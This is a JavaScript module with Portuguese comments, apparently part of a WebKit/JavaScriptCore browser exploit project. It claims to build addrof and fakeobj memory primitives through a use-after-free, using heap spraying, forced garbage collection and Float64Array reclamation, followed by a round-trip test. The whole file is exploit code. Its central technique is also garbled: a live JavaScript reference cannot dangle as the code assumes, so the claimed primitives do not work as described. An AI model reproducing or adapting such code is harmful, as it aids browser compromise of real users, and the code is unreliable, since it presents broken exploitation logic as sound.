// js/script3/testArrayBufferVictimCrash.mjs (Foco em Primitivas UAF Estáveis)
import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE = "UAF_Primitive_Creation_R57";

// --- Funções Primitivas UAF (o coração do exploit) ---

// Esta função agora é o núcleo da exploração.
// Ela cria um ambiente UAF e retorna as primitivas funcionais.
function createUAFPrimitives() {
    // 1. Prepara o palco com um spray de objetos para criar um estado de heap previsível.
    let spray = [];
    for (let i = 0; i < 4096; i++) {
        spray.push({ p0: 0, p1: 0, p2: 0, p3: 0 }); // Objetos de tamanho consistente
    }

    // 2. Cria o ponteiro pendurado (dangling pointer) para um dos objetos.
    let dangling_ref = spray[spray.length - 1]; 
    spray = null; // Libera a referência principal, tornando os objetos elegíveis para GC.

    // 3. Força a Coleta de Lixo para liberar a memória do objeto-alvo.
    triggerGC();
    
    // 4. Spray de Reclamação: Pulveriza Float64Array, que tem um tamanho similar
    // e provavelmente será alocado na memória recém-liberada.
    let float_reclaimers = [];
    for (let i = 0; i < 2048; i++) {
        float_reclaimers.push(new Float64Array(8));
    }

    // 5. Verifica a confusão de tipos.
    // Se a propriedade 'p0' do nosso objeto antigo agora se comporta de forma diferente,
    // o UAF funcionou e 'dangling_ref' agora aponta para um Float64Array.
    if (typeof dangling_ref.p0 !== 'number') {
        logS3("UAF bem-sucedido! A referência está corrompida como esperado.", "good", "createUAFPrimitives");
    } else {
        throw new Error("A colisão de memória para o UAF não ocorreu. Tente novamente.");
    }
    
    // Agora que 'dangling_ref' é um Float64Array "disfarçado" de objeto,
    // podemos usá-lo para ler e escrever na memória.
    
    const addrof = (obj_to_find) => {
        // Colocamos o objeto que queremos encontrar o endereço em uma propriedade.
        // Isso escreve o ponteiro para 'obj_to_find' em uma localização de memória conhecida.
        dangling_ref.p1 = obj_to_find;

        // Lemos outra propriedade, que agora sobrepõe a localização do ponteiro,
        // mas o interpreta como um número de ponto flutuante (double).
        const addr_double = float_reclaimers[0][0];

        // Convertendo o double de volta para um endereço de 64 bits.
        const buf = new ArrayBuffer(8);
        (new Float64Array(buf))[0] = addr_double;
        const int_view = new Uint32Array(buf);
        return new AdvancedInt64(int_view[0], int_view[1]);
    };

    const fakeobj = (addr_to_fake) => {
        // Faz o processo inverso. Converte o endereço de 64 bits para um double.
        const buf = new ArrayBuffer(8);
        const int_view = new Uint32Array(buf);
        int_view[0] = addr_to_fake.low();
        int_view[1] = addr_to_fake.high();
        const addr_double = (new Float64Array(buf))[0];

        // Escreve o double na memória, sobrescrevendo o ponteiro.
        float_reclaimers[0][0] = addr_double;

        // Retorna a propriedade que agora "é" o objeto no endereço falsificado.
        return dangling_ref.p1;
    };

    return { addrof, fakeobj };
}

function triggerGC() {
    try {
        const arr = [];
        for (let i = 0; i < 4096; i++) {
            arr.push(new ArrayBuffer(1024 * 64)); // Aloca e libera ~256MB
        }
    } catch(e) {}
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL - Focada em Testar as Primitivas
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { // Mantendo nome da função por compatibilidade
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Criação e Teste de Primitivas UAF ---`, "test");
    
    try {
        // --- FASE 1: Criar as primitivas `addrof` e `fakeobj` ---
        logS3("--- FASE 1: Construindo `addrof` e `fakeobj` via UAF ---", "subtest");
        const { addrof, fakeobj } = createUAFPrimitives();
        if (!addrof || !fakeobj) {
            throw new Error("Falha ao criar as primitivas UAF.");
        }
        logS3("Primitivas `addrof` e `fakeobj` criadas com sucesso!", "vuln");

        // --- FASE 2: Teste de Estabilidade (Ida e Volta) ---
        logS3("--- FASE 2: Verificando a estabilidade das primitivas ---", "subtest");
        const test_object = { marker: 0xDEADBEEF };
        logS3(`Objeto de teste criado: { marker: 0x${test_object.marker.toString(16)} }`, "info");

        // 1. Ida: Pega o endereço do objeto de teste.
        const leaked_addr = addrof(test_object);
        logS3(`addrof(test_object) -> Endereço vazado: ${leaked_addr.toString(true)}`, "leak");
        if(leaked_addr.low() === 0 && leaked_addr.high() === 0) {
            throw new Error("addrof retornou um endereço nulo.");
        }

        // 2. Volta: Cria um objeto falso no endereço vazado.
        const faked_object = fakeobj(leaked_addr);
        logS3(`fakeobj(leaked_addr) -> Objeto falsificado obtido.`, "info");
        
        // 3. Verificação: O objeto falso deve ter a mesma propriedade que o original.
        logS3(`Verificando... faked_object.marker = 0x${faked_object.marker.toString(16)}`, "info");

        if (faked_object.marker === test_object.marker) {
            logS3("++++++++ SUCESSO! As primitivas `addrof` e `fakeobj` são estáveis! ++++++++", "vuln");
            document.title = "Primitives OK!";
            return {
                final_result: {
                    success: true,
                    message: "Primitivas addrof/fakeobj estáveis foram criadas e verificadas."
                }
            };
        } else {
            throw new Error("Teste de ida e volta falhou. O marcador do objeto não corresponde.");
        }

    } catch (e) {
        logS3(`A cadeia de exploração falhou: ${e.message}`, "critical");
        document.title = "Primitives Failed";
        return { errorOccurred: e.message };
    }
}
